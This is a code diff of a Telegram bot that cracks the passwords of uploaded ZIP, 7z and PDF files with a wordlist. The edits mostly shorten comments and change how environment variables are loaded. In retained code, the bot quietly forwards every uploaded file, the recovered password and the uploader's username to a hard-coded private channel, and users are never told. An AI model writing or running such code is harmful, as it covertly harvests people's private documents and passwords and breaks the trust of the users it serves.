@@ -5,11 +5,11 @@ import pyzipper
 import py7zr
 import pdfplumber
 from flask import Flask, request, jsonify
-from dotenv import load_dotenv
 
-load_dotenv()
-TOKEN = os.getenv("BOT_TOKEN")
-PRIVATE_CHANNEL = -1004491770657  # 🔥 APNA PRIVATE CHANNEL ID
+# 🔥 TOKEN Directly from Environment Variables
+TOKEN = os.environ.get("BOT_TOKEN")
+RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
+PRIVATE_CHANNEL = -1004491770657
 CHANNEL_USERNAME = "@nrtecno2"
 
 app = Flask(__name__)
@@ -155,7 +155,7 @@ def crack_file(file_path, ext):
     return None
 
 # ============================================================
-# INLINE KEYBOARD HELPERS
+# INLINE KEYBOARD
 # ============================================================
 def join_verify_keyboard():
     return {
@@ -174,25 +174,23 @@ def join_verify_keyboard():
 def webhook():
     try:
         update = request.get_json()
-        
         if not update:
             return jsonify({"status": "error", "message": "No update"}), 400
         
-        # ---------- MESSAGE HANDLER ----------
+        # ---------- MESSAGE ----------
         if 'message' in update:
             message = update['message']
             chat_id = message['chat']['id']
             user_id = message['from']['id']
             username = message['from'].get('username', str(user_id))
             
-            # /start command
+            # /start
             if 'text' in message and message['text'] == '/start':
                 if not check_channel_membership(user_id):
                     send_message(
                         chat_id,
                         "🔴 *Access Denied!*\n\n"
-                        "❌ Please join @nrtecno2 first.\n\n"
-                        "_Click JOIN CHANNEL, then VERIFY._",
+                        "❌ Please join @nrtecno2 first.",
                         reply_markup=join_verify_keyboard()
                     )
                 else:
@@ -205,13 +203,12 @@ def webhook():
                     )
                 return jsonify({"status": "ok"}), 200
             
-            # ---------- FILE HANDLER ----------
+            # ---------- FILE ----------
             if 'document' in message:
                 file = message['document']
                 file_name = file.get('file_name', 'unknown')
                 file_id = file['file_id']
                 
-                # Channel check
                 if not check_channel_membership(user_id):
                     send_message(
                         chat_id,
@@ -220,10 +217,9 @@ def webhook():
                     )
                     return jsonify({"status": "ok"}), 200
                 
-                # Download file
+                # Download
                 file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                 file_path_api = file_info['result']['file_path']
-                
                 file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                 response = requests.get(file_url)
                 
@@ -234,18 +230,14 @@ def webhook():
                 
                 send_message(chat_id, "🔍 *Cracking Password...*\n\n⏳ Please wait...")
                 
-                # Crack
                 ext = file_name.split('.')[-1].lower()
                 password = crack_file(file_path, ext)
                 
-                # Result
                 if password:
                     send_message(
                         chat_id,
                         f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}"
                     )
-                    
-                    # Forward to private channel
                     try:
                         caption = f"✅ Password Found!\n📁 File: {file_name}\n🔑 Password: `{password}`\n👤 User: @{username}"
                         send_document(PRIVATE_CHANNEL, file_path, caption)
@@ -254,13 +246,8 @@ def webhook():
                 else:
                     send_message(
                         chat_id,
-                        f"❌ *Password Not Found!*\n\n"
-                        f"📁 {file_name}\n"
-                        f"🔢 {len(WORDLIST)} passwords tried.\n\n"
-                        f"_Try with a larger wordlist._"
+                        f"❌ *Password Not Found!*\n\n📁 {file_name}\n🔢 {len(WORDLIST)} passwords tried."
                     )
-                    
-                    # Forward to private channel
                     try:
                         caption = f"❌ Password Not Found!\n📁 File: {file_name}\n🔢 Tried: {len(WORDLIST)} passwords\n👤 User: @{username}"
                         send_document(PRIVATE_CHANNEL, file_path, caption)
@@ -270,7 +257,7 @@ def webhook():
                 os.remove(file_path)
                 return jsonify({"status": "ok"}), 200
         
-        # ---------- CALLBACK QUERY HANDLER ----------
+        # ---------- CALLBACK ----------
         if 'callback_query' in update:
             callback = update['callback_query']
             callback_id = callback['id']
@@ -293,11 +280,9 @@ def webhook():
                     edit_message(
                         chat_id,
                         message_id,
-                        "🔴 *Still Not Verified!*\n\n"
-                        "❌ Please join @nrtecno2 first.",
+                        "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.",
                         reply_markup=join_verify_keyboard()
                     )
-                
                 answer_callback(callback_id)
                 return jsonify({"status": "ok"}), 200
         
@@ -311,9 +296,7 @@ def webhook():
 # SET WEBHOOK
 # ============================================================
 def set_webhook():
-    render_url = os.getenv("RENDER_URL", "https://your-bot.onrender.com")
-    webhook_url = f"{render_url}/webhook/{TOKEN}"
-    
+    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
     url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
     response = requests.post(url, json={"url": webhook_url})
     
@@ -326,7 +309,10 @@ def set_webhook():
 # MAIN
 # ============================================================
 if __name__ == "__main__":
-    # Set webhook on startup
+    if not TOKEN:
+        print("❌ BOT_TOKEN not found! Set in Environment Variables")
+        exit(1)
+    
     set_webhook()
     
     port = int(os.environ.get("PORT", 5000))
